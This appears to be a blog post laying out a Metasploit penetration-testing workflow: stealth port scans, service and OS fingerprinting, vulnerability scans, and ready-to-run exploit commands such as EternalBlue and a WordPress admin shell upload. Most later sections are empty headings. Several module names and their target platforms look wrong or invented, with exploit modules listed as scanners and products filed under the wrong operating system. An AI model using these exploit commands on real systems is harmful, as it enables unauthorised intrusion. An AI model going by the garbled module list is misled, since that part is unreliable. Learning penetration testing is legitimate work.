---
title: "Operazioni Del Cappello Bianco"
date: 2024-03-31T14:03:21Z
draft: false
---
Search google : metasploit for xz ssh vulnerability
## 1. Starting Metasploit
Run this command:
```
msfconsole
```
## 2. Reconnaissance
### 2.1 Passive Reconnaissance Techniques
* WHOIS Lookup: Typically performed using external tools or online services dedicated to WHOIS queries.
* Social Media Analysis: Involves manual investigation or specialized tools tailored for social media intelligence.
* Job Postings and Career Pages: Requires manual research into job listings and career pages on the target organization's website or other job platforms.
* Publicly Available Information: Involves gathering information from various public sources, such as company websites, press releases, news articles, and industry reports, through manual research or specialized tools.
* Passive DNS Monitoring: Typically performed using external tools or online services that monitor and analyze historical DNS data.
* Email Header Analysis: Involves analyzing email headers to gather information about the sender, recipient, mail servers, and message routing, usually done using specialized email forensics tools.

These techniques rely on manual investigation, specialized tools, or online services external to Metasploit for gathering information about the target organization's digital footprint.


**1. DNS Enumeration:**
* Metasploit Module: auxiliary/gather/dns_enum
* Command:
```
use auxiliary/gather/dns_enum
set RHOSTS <target_ip_range>
run

```
* Options:
* RHOSTS: Specifies the target IP range to perform DNS enumeration.

**2. Web Server Banner Grabbing:**
* Metasploit Module: auxiliary/scanner/http/http_title
* Command:
```
use auxiliary/scanner/http/http_title
set RHOSTS <target_ip_range>
run

```
* Options:
* RHOSTS: Specifies the target IP range to perform web server banner grabbing.

** 3. Stealthy TCP Port Scanning:**
* Metasploit Module: auxiliary/scanner/portscan/tcp
* Command:
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip_range>
set SLEEP 5
set THREADS 1
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform TCP port scanning.
* SLEEP: Sets a delay (in seconds) between each scan request. Helps in making the scan less noticeable. Adjust as needed.
* THREADS: Specifies the number of concurrent scan threads. Lower values make the scan slower and less conspicuous.
* TIMEOUT: (Optional) Specifies the maximum time to wait for a response from each target port. Default is 5 seconds. Adjust as needed.
### 2.2 Active Reconnaissance Techniques
### 2.2.1 Port Scanning
Identifying open ports and services running on target systems.

### 2.2.1.1 Stealthy TCP SYN Port Scanning:**
* Metasploit Module: auxiliary/scanner/portscan/tcp
* Command:
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip_range>
set SCANNER_TYPE syn
set SLEEP 5
set THREADS 1
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform TCP port scanning.
* SCANNER_TYPE: Specifies the type of scanner to use. Set to syn for TCP SYN scanning.
* SLEEP: Sets a delay (in seconds) between each scan request. Helps in making the scan less noticeable. Adjust as needed.
* THREADS: Specifies the number of concurrent scan threads. Lower values make the scan slower and less conspicuous.
* TIMEOUT: (Optional) Specifies the maximum time to wait for a response from each target port. Default is 5 seconds. Adjust as needed.

A SYN scan is a stealthy port scanning technique that sends SYN packets to target ports and analyzes responses to identify open ports without completing the TCP handshake.
### 2.2.1.2 TCP Connect Scan:
* Metasploit Module: auxiliary/scanner/portscan/tcp
*Command:
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip_range>
set SCANNER_TYPE connect
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform TCP port scanning.
* SCANNER_TYPE: Specifies the type of scanner to use. Set to connect for TCP Connect scanning.

This command will initiate a TCP Connect port scan using Metasploit, where a full TCP connection is established with each target port to determine its status. Adjust the RHOSTS option to specify the target IP range.

### 2.2.1.3 TCP NULL Scan:
* Metasploit Module: auxiliary/scanner/portscan/tcp
* Command:
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip_range>
set SCANNER_TYPE null
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform TCP port scanning.
*SCANNER_TYPE: Specifies the type of scanner to use. Set to null for TCP NULL scanning.

This command will initiate a TCP NULL port scan using Metasploit, where packets with no flags set (NULL packets) are sent to target ports to determine their status. Adjust the RHOSTS option to specify the target IP range.


### 2.2.1.4 TCP FIN Scan:
* Metasploit Module: auxiliary/scanner/portscan/tcp
* Command:
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip_range>
set SCANNER_TYPE fin
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform TCP port scanning.
* SCANNER_TYPE: Specifies the type of scanner to use. Set to fin for TCP FIN scanning.

This command will initiate a TCP FIN port scan using Metasploit, where packets with only the FIN flag set are sent to target ports to determine their status. Adjust the RHOSTS option to specify the target IP range.

### 2.2.1.5 TCP XMAS Scan:
* Metasploit Module: auxiliary/scanner/portscan/tcp
* Command:
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip_range>
set SCANNER_TYPE xmas
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform TCP port scanning.
* SCANNER_TYPE: Specifies the type of scanner to use. Set to xmas for TCP XMAS scanning.

This command will initiate a TCP XMAS port scan using Metasploit, where packets with the FIN, URG, and PSH flags set are sent to target ports to determine their status. Adjust the RHOSTS option to specify the target IP range.

## 2.2.1.5 UDP Scan:
* Metasploit Module: auxiliary/scanner/udp/udp_scan
* Command:
```
use auxiliary/scanner/udp/udp_scan
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform UDP port scanning.

This command will initiate a UDP port scan using Metasploit, where UDP packets are sent to target ports to determine their status. Adjust the RHOSTS option to specify the target IP range.



### 2.2.2 Service Enumeration
Gathering detailed information about the services and applications running on open ports.

### 2.2.2.1 Port Identification: 
* Review the results of the port scan to identify open ports on the target system. 
* Focus on ports commonly associated with services such as HTTP (port 80), HTTPS (port 443), SSH (port 22), FTP (port 21), SMTP (port 25), DNS (port 53), etc.

### 2.2.2.2 Service Identification: 
Once open ports are identified, use tools like Nmap or banner grabbing techniques to determine the specific services and applications running on those ports.

* Metasploit Module: auxiliary/scanner/portscan/service_version
* Command:
```
use auxiliary/scanner/portscan/service_version
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform service identification.

This command will initiate service identification using Metasploit, where the tool will attempt to extract service banners from open ports on the target system to identify the associated services and versions. Adjust the RHOSTS option to specify the target IP range.

### 2.2.2.3 Banner Grabbing: 
Banner grabbing is a reconnaissance technique used to extract information from service banners, which are metadata or identification strings sent by network services upon connection establishment. These banners often include details such as service name, version number, and sometimes even operating system information. Banner grabbing can provide valuable insights into the target system's configuration and potentially reveal vulnerabilities that can be exploited.

**Example using Metasploit:**
* Metasploit Module: auxiliary/scanner/portscan/banner_grab
* Command:
```
use auxiliary/scanner/portscan/banner_grab
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform banner grabbing.

This command will initiate banner grabbing using Metasploit, where the tool will attempt to extract service banners from open ports on the target system to identify the associated services and versions. Adjust the RHOSTS option to specify the target IP range.

**Here are some examples of what service banners might look like for different types of services:**

HTTP Service:
```
Server: Apache/2.4.29 (Ubuntu)
```

FTP Service:
```
220 ProFTPD Server (Version X.X.X) [hostname]
```

SSH Service:
```
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
```

SMTP Service:
```
220 mail.example.com ESMTP Postfix (Ubuntu)
```

DNS Service:
```
BIND 9.11.3-1ubuntu1.13-Ubuntu (Ubuntu)
```

Database Service (MySQL):
```
5.7.33-log
```

### 2.2.2.4 Automation: 
**To list all available exploitation modules:**
```
msfconsole

show exploits

```


### 2.2.3 Operating System Fingerprinting
Determining the operating system of target systems based on responses to network probes.

* Metasploit Module: auxiliary/scanner/os/os_identify
* Command:
```
use auxiliary/scanner/os/os_identify
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform operating system fingerprinting.

This command will initiate operating system fingerprinting using Metasploit, where the tool will attempt to identify the operating systems running on the target systems within the specified IP range.

For example, when conducting operating system fingerprinting, Metasploit might provide the following types of fingerprints:

These fingerprints help in identifying the underlying operating system and version running on the target systems, which can be valuable information for penetration testing and security assessments. Adjust the RHOSTS option to specify the target IP range.

Here are a few examples of operating system fingerprints that might be provided by tools like Metasploit:

* Linux Kernel Fingerprint:
* Example: Linux 4.15.0-54-generic

* Windows Version Fingerprint:
* Example: Microsoft Windows 10 Pro Version 10.0.18363 Build 18363

* macOS Version Fingerprint:
* Example: Mac OS X 10.15.7




### 2.2.4 Vulnerability Scanning
Identifying potential security vulnerabilities in target systems or applications.

### 2.2.4.1 For Windows Systems:
* Metasploit Module: auxiliary/scanner/http/microsoft_iis_webdav_scstoragepathfromurl
* Command:
```
use auxiliary/scanner/http/microsoft_iis_webdav_scstoragepathfromurl
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform the vulnerability scan on Windows systems.

This command will initiate a vulnerability scan targeting Windows systems to check for the Microsoft IIS WebDAV ScStoragePathFromUrl Remote Code Execution vulnerability.

### 2.2.4.2 For Linux Systems:
* Metasploit Module: auxiliary/scanner/ssh/ssh_version
* Command:
```
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform the vulnerability scan on Linux systems.

This command will initiate a vulnerability scan targeting Linux systems to check for SSH service version information.

### 2.2.4.3 For macOS Systems:
* Metasploit Module: auxiliary/scanner/http/webmin_packageup_rce
* Command:
```
use auxiliary/scanner/http/webmin_packageup_rce
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range to perform the vulnerability scan on macOS systems.

This command will initiate a vulnerability scan targeting macOS systems to check for the Webmin Package Updates Remote Command Execution vulnerability.

Adjust the RHOSTS option to specify the target IP range accordingly for each scan. These commands will help identify vulnerabilities specific to each operating system, facilitating targeted vulnerability assessment and remediation efforts.

### 2.2.5 Password Cracking
Attempting to crack passwords or gain unauthorized access to target systems.

### 2.2.6 Exploitation
Attempting to exploit identified vulnerabilities to gain access or escalate privileges on target systems.

### 2.2.6.1 For Windows Systems:
* Metasploit Module: exploit/windows/smb/ms17_010_eternalblue
* Command:
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
exploit
```
* Options:
* RHOSTS: Specifies the target IP address of the Windows system.

This command will initiate the EternalBlue exploit targeting Windows systems to achieve remote code execution on vulnerable SMB versions.

### 2.2.6.2 For Linux Systems:
* Metasploit Module: exploit/linux/http/elastic_search_rce
* Command:
```
use exploit/linux/http/elastic_search_rce
set RHOSTS <target_ip>
exploit
```
* Options:
* RHOSTS: Specifies the target IP address of the Linux system.

This command will initiate the ElasticSearch Remote Code Execution exploit targeting Linux systems.

### 2.2.6.3 For MacOS Systems:
* Metasploit Module: exploit/osx/http/webkit_script_exec
* Command:
```
use exploit/osx/http/webkit_script_exec
set RHOSTS <target_ip>
exploit
```
* Options:
* RHOSTS: Specifies the target IP address of the macOS system.

This command will initiate the WebKit Script Execution exploit targeting macOS systems.

### 2.2.6.4 For Oracle Database:
* Metasploit Module: exploit/windows/oracle/weblogic_deserialize
* Command:
```
use exploit/windows/oracle/weblogic_deserialize
set RHOSTS <target_ip>
exploit
```
* Options:
* RHOSTS: Specifies the target IP address of the Oracle Database server.

This command will initiate the Oracle WebLogic Deserialization exploit targeting Oracle Database servers.

### 2.2.6.5 For WordPress:
* Metasploit Module: exploit/unix/webapp/wp_admin_shell_upload
* Command:
```
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <target_ip>
exploit
```
* Options:
* RHOSTS: Specifies the target IP address of the WordPress site.

This command will initiate the WordPress Admin Shell Upload exploit targeting WordPress sites.

Adjust the RHOSTS option to specify the target IP address accordingly for each exploit. These commands will help demonstrate the exploitation of vulnerabilities specific to each target platform.

### 2.3 Open Source Intelligence (OSINT) Gathering

### 2.4 Social Engineering Reconnaissance

### 2.5 Tools and Methods for Reconnaissance

## 3. Footprinting
### 3.1 Domain Name System (DNS) Footprinting
* Metasploit Module: auxiliary/gather/dns_enum
* Command:
```
use auxiliary/gather/dns_enum
set DOMAIN <target_domain>
run
```
* Options:
* DOMAIN: Specifies the target domain name for DNS enumeration.

This command will initiate DNS enumeration using Metasploit, where the tool will gather information about the target domain's DNS records, such as hostnames, IP addresses, mail servers, and more.

Adjust the DOMAIN option to specify the target domain name accordingly. This command will help gather valuable reconnaissance information about the target domain, aiding in further penetration testing and security assessments.


### 3.2 Network Enumeration
* Metasploit Module: auxiliary/scanner/discovery/arp_sweep
* Command:
```
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range for ARP sweep enumeration.

This command will initiate ARP sweep enumeration using Metasploit, where the tool will send ARP requests to the specified IP range to discover live hosts on the network and their corresponding MAC addresses.

Adjust the RHOSTS option to specify the target IP range accordingly. This command will help identify live hosts on the network, facilitating further reconnaissance and potential vulnerability assessment.

### 3.3 Web Footprinting
* Metasploit Module: auxiliary/gather/http_google_enum
* Command:
```
use auxiliary/gather/http_google_enum
set DOMAIN <target_domain>
run
```
* Options:
* DOMAIN: Specifies the target domain for Google enumeration.

This command will initiate Google enumeration using Metasploit, where the tool will search Google for indexed web pages related to the specified domain. It gathers information such as web pages, subdomains, URLs, and more associated with the target domain.

**Results:** \
Upon running the enumeration, the results might include: \
1. URLs of indexed web pages related to the target domain.
2. Subdomains discovered through Google indexing.
3. Information about web servers, technologies, and frameworks used on the target domain.
4. Other publicly available information related to the target domain, such as social media profiles, forums, and more.
5. These results provide valuable insights into the online footprint of the target domain, aiding in further reconnaissance and potential attack surface identification.


## 4. Scanning
### 4.1 Network Scanning
**Syn Scan recomended** \
* Metasploit Module: auxiliary/scanner/portscan/syn
* Command:
```
use auxiliary/scanner/portscan/syn
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range for SYN scan.

This command will initiate SYN scan using Metasploit, where the tool will send SYN packets to the specified IP range to discover open ports on the target systems.

Adjust the RHOSTS option to specify the target IP range accordingly. This command will help identify open ports on the target systems, providing valuable information for further reconnaissance and potential vulnerability assessment.

### 4.2 Port Scanning
* Metasploit Module: auxiliary/scanner/portscan/tcp
* Command:
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range for port scanning.

This command will initiate TCP port scanning using Metasploit, where the tool will attempt to connect to TCP ports on the specified IP range to determine their status (open, closed, or filtered).

Adjust the RHOSTS option to specify the target IP range accordingly. This command will help identify open ports on the target systems, providing valuable information for further reconnaissance and potential vulnerability assessment.

### 4.3 Vulnerability Scanning

### 4.3.1 For Windows Systems:
* Metasploit Module: auxiliary/scanner/http/wp_admin_shell_upload
* Command:
```
use auxiliary/scanner/http/wp_admin_shell_upload
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range for vulnerability scanning on Windows systems.

This command will initiate a vulnerability scan targeting WordPress sites on Windows systems to check for the WordPress Admin Shell Upload vulnerability.

### 4.3.2 For Linux Systems:
* Metasploit Module: auxiliary/scanner/http/wordpress_pingback_access
* Command:
```
use auxiliary/scanner/http/wordpress_pingback_access
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range for vulnerability scanning on Linux systems.

This command will initiate a vulnerability scan targeting WordPress sites on Linux systems to check for the WordPress Pingback Access vulnerability.

### 4.3.3 For Oracle Database:
* Metasploit Module: auxiliary/scanner/oracle/oracle_default_passwords
* Command:
```
use auxiliary/scanner/oracle/oracle_default_passwords
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range for vulnerability scanning on Oracle Database systems.

This command will initiate a vulnerability scan targeting Oracle Database systems to check for default passwords.

### 4.3.4 For WordPress:
* Metasploit Module: auxiliary/scanner/http/wordpress_login_enum
* Command:
```
use auxiliary/scanner/http/wordpress_login_enum
set RHOSTS <target_ip_range>
run
```
* Options:
* RHOSTS: Specifies the target IP range for vulnerability scanning on WordPress sites.

This command will initiate a vulnerability scan targeting WordPress sites to check for weak or default login credentials.

Adjust the RHOSTS option to specify the target IP range accordingly for each scan. These commands will help identify vulnerabilities specific to each target platform, facilitating targeted vulnerability assessment and remediation efforts.

## 5. Enumeration
### 5.1 Active Enumeration Techniques

### 5.2 Windows Enumeration

### 5.3 Unix/Linux Enumeration

### 5.4 Service Enumeration

### 5.5 Enumeration Tools and Scripts

## 6. Vulnerability Analysis
### 6.1 Vulnerability Assessment Methodology

### 6.2 Automated Vulnerability Scanning

### 6.3 Manual Vulnerability Analysis

### 6.4 Common Vulnerabilities and Exposures (CVEs)

### 6.5 Vulnerability Databases and Resources

## 7. Exploitation
### 7.1 Exploitation Fundamentals

### 7.2 Exploit Development

### 7.3 Metasploit Framework

### 7.4 Buffer Overflow Exploitation

### 7.5 Exploitation Techniques and Tactics

## 8. Post-Exploitation
### 8.1 Maintaining Access

### 8.2 Privilege Escalation

### 8.3 Data Exfiltration

### 8.4 Covering Tracks

### 8.5 Post-Exploitation Tools and Frameworks

## 9. Reporting and Documentation
### 9.1 Reporting Structure and Format

### 9.2 Documenting Findings and Observations

### 9.3 Risk Prioritization and Classification

### 9.4 Compliance Reporting

### 9.5 Client Communication and Reporting

## 10. Remediation and Follow-up
### 10.1 Remediation Planning
### 10.2 Patch Management
### 10.3 Security Controls Implementation
### 10.4 Continuous Monitoring and Evaluation
### 10.5 Post-Engagement Review and Feedback
